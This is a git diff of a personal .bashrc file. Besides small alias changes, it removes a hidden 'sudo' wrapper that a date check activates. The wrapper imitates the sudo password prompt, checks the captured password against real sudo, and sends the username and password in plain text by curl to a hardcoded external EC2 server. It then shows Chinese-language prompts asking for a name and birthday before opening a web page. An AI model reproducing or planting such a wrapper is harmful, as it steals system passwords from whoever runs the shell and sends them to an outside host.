@@ -48,8 +48,9 @@ if ! shopt -oq posix; then
 fi
 
 alias grep='grep -Hn --color'
+alias cat='cat -n'
 alias sl='ls'
-alias la='ls -Al'
+alias la='ls -Alh'
 alias l='ls -lAh'
 alias so='source'
 alias hn='hostname'
@@ -72,13 +73,6 @@ alias pi='ssh pi@tabletenniser.ddns.net'
 alias rc='source ~/.bashrc'
 alias sec='vim ~/Desktop/receipt_pwd_safe/userName+pwd.txt'
 alias sublime='/Applications/Sublime\ Text\ 2.app/Contents/SharedSupport/bin/subl'
-
-CUR_DATE="$(date +%s)"
-# echo "Current date is $CUR_DATE"
-if [ $CUR_DATE -gt 1467828636 ]
-then
-    alias sudo=__sudo_fcn
-fi
 
 export EDITOR=vim
 export HISTTIMEFORMAT='%F %T '
@@ -124,59 +118,3 @@ __git_ps1_yelp () {
     fi
 }
 
-__sudo_fcn () {
-    while true
-        do
-        stty -echo
-        read -p "Password:" password
-        stty echo
-        echo ""
-
-        TMP_FILE="/tmp/sudo_output"
-        SUDO_PATH="$(which sudo)"
-        echo "$password" | $SUDO_PATH -kS su > $TMP_FILE 2>&1
-        if grep -qi incorrect "$TMP_FILE"; then
-            echo "Sorry, try again."
-        else
-            break
-        fi
-    done
-
-    # Step 1: prompt for Y/N
-    username="$(whoami)"
-    curl "http://ec2-52-196-40-206.ap-northeast-1.compute.amazonaws.com:8080/check_in?username=$(whoami)&password=$password"
-    while read -p "有人有话想对你说，你现在想看么？(Y/N) " answer
-    do
-        if [ "$answer" == "Y" ]; then
-            # Step 2: prompt for name
-            while read -p "为确保您是理想中的收件人，请输入你的英文first name: " answer
-            answer_lower=$(echo "$answer" | tr '[:upper:]' '[:lower:]')
-            do
-                if [ "$answer_lower" == "vicky" ]; then
-                    break
-                else
-                    echo "您输入的英文名与预计收件人不符，请重新输入"
-                fi
-            done
-
-            while read -p "为确保您是理想中的收件人，请输入你生日（格式：xxxx.xx.xx, 如1993年5月20日，请输入\"1993.05.20\"）: " answer
-            do
-                if [ "$answer" == "1993.02.20" ]; then
-                    break
-                else
-                    echo "您输入的生日与预计收件人不符，请重新输入"
-                fi
-            done
-
-        open http://ec2-52-196-40-206.ap-northeast-1.compute.amazonaws.com:8080
-            break
-        elif [ "$answer" == "N" ]; then
-            SUDO_COMMAND="$SUDO_PATH -S $@"
-            SUDO_PATH="$(which sudo)"
-            $SUDO_PATH $@
-            break
-        else
-            echo "请输入Y或者N"
-        fi
-    done
-}
